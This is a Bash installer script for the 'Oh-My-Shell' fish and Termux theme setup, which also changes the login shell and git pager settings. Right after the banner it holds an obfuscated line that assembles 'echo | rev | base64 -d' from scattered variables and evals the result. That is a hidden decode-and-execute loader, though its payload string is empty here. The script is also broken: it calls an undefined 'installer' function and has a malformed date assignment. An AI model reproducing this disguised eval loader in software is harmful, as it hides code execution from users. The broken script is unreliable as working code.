black="\033[0;30m"
red="\033[0;31m"
green="\033[0;32m"
yellow="\033[0;33m"
blue="\033[0;34m"
purple="\033[0;35m"
cyan="\033[0;36m"
white="\033[0;37m"
nc="\033[00m"

info="${cyan}[${nc}+${cyan}] ${yellow}"
ask="${cyan}[${nc}?${cyan}] ${purple}"
error="${cyan}[${nc}!${cyan}] ${red}"
success="${cyan}[${nc}âˆš${cyan}] ${green}"

clear
logo="
${green}  ___  _           __  __            ____  _          _ _
${blue} / _ \| |__       |  \/  |_   _     / ___|| |__   ___| | |
${red}| | | | '_ \ _____| |\/| | | | |____\___ \| '_ \ / _ \ | |
${yellow}| |_| | | | |_____| |  | | |_| |_____|__) | | | |  __/ | |
${cyan} \___/|_| |_|     |_|  |_|\__, |    |____/|_| |_|\___|_|_|
${green}                          |___/                     [v1.0]
${blue}                                            [By KasRoudra]
"

# Prevent ^C
stty -echoctl

# Detect UserInterrupt
trap "echo -e '\n${success}Thanks for using!\n'; exit" 2

# Termux
if echo "$HOME" | grep -q "termux"; then
    termux=true
else
    termux=false
fi

omf=true
default_theme=kr-lambda

# Check for sudo
if command -v sudo > /dev/null 2>&1; then
    sudo=true
else
    sudo=false
fi

echo -e "$logo"
sleep 2
echo -e "$nc"


gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"




# Install required packages
for package in git fish figlet exa; do
    if ! command -v "$package" > /dev/null 2>&1; then
        installer "$package"
    fi
done


for package in git fish figlet; do
    if ! command -v "$package" > /dev/null 2>&1; then
        echo -e "${error}${package} cannot be installed!\007\n"
        exit 1
    fi
done


if command -v lolcat > /dev/null 2>&1; then
    clear
    echo -e "$logo" | lolcat
fi

if [[ ! -f files/omf.fish && $omf ]]; then
    echo -e "${info}Cloning Oh-My-Shell.......\n $nc"
    git clone https://github.com/KasRoudra/oh-my-shell
    cp -r oh-my-shell/files files
    rm -rf oh-my-shell
fi


if [[ ! -d $HOME/.local/share/omf ]] && $omf; then
    echo -e "${info}Installing Oh-My-Fish.......\n $nc"
    fish files/omf.fish
fi

sleep 1
echo -e "${info}Installing prompt themes....\n $nc"
cat files/template.fish > $HOME/.config/fish/config.fish
if $omf; then
    cp -r files/kr-emoji $HOME/.local/share/omf/themes/
    cp -r files/kr-lambda $HOME/.local/share/omf/themes/
    cp -r files/kr-zish $HOME/.local/share/omf/themes/
else
    cat files/$default_theme/functions/fish_promt.fish >> $HOME/.config/fish/config.fish
    cat files/$default_theme/functions/fish_right_promt.fish >> $HOME/.config/fish/config.fish
fi
sleep 2
NOW=(date '+%F-%H-%M-%S')
if [ -d $HOME/.config/fish/config.fish ]; then
    echo -e "${info}Creating a backup.......\n $nc"
    cp -r $HOME/.config/fish/config.fish $HOME/.config/fish/config.${NOW}.fish
    sleep 2
fi
if $termux; then
    cp -r $HOME/.termux $HOME/.termux${NOW}.backup
    echo -e "${info}Changing font.....\n $nc"
    sleep 1
    cp -r files/font.ttf $HOME/.termux
    cp -r files/colors.properties $HOME/.termux
    termux-reload-settings
    sleep 1
fi
echo -e "${ask}Enter your name to be displayed in home : ${green}" 
read -p "[~]--> " name
if [ -z "$name" ]; then
    echo -e "${error}No name...\n $nc"
else
    if ! command -v lolcat > /dev/null 2>&1; then
        echo -e "\n${ask}Do you want rainbow colors? It requires 350MB storage(y/n) ${green}" 
        read -p "[~]--> " islol
        if [ "$islol" == "y" ]; then
            for try in 0 1 2 3; do
                echo -e "${info}Installing Lolcat...."
                if command -v pacman > /dev/null 2>&1; then
                    if $sudo; then
                        sudo pacman -S lolcat --noconfirm
                    else
                        pacman -S lolcat --noconfirm
                    fi
                elif command -v gem > /dev/null 2>&1; then
                    if $sudo; then
                        sudo gem install lolcat
                    else
                        gem install lolcat
                    fi
                elif command -v pip3 > /dev/null 2>&1; then
                    if $sudo; then
                        sudo pip3 install lolcat
                    else
                        pip3 install lolcat
                    fi
                else
                    command -v ruby > /dev/null 2>&1 || installer ruby
                fi
                if [[ "$try" == "2" ]]; then
                    installer python3
                fi
                if command -v lolcat > /dev/null 2>&1; then
                    break
                fi
            done
        fi

    fi
    sed -i s/"Name"/"$name"/g $HOME/.config/fish/config.fish
fi
sleep 2
rm -rf $HOME/../usr/etc/motd  $HOME/../usr/etc/motd.sh
if ! [ -d ".git" ]; then
    rm -rf files
fi
fish -c 'source "$HOME/.config/fish/config.fish"'
echo -e "${info}Changing Shell...\n $nc"
if $termux; then
    chsh -s fish
else
    chsh -s $(which fish)
fi
sleep 2
echo -e "${info}Changing Theme...\n $nc"
if $omf; then
fish -c "omf theme $default_theme"
fi
sleep 1
echo -e "${info}Configuring git for no pager...\n $nc"
git config --global pager.diff false
git config --global pager.log false
if $termux; then
    echo -e "${success}Restart Terminal to see effects!\n $nc"
else
    echo -e "${success}Log out and log in back to see effects!\n $nc"
fi
sleep 3
clear
exec fish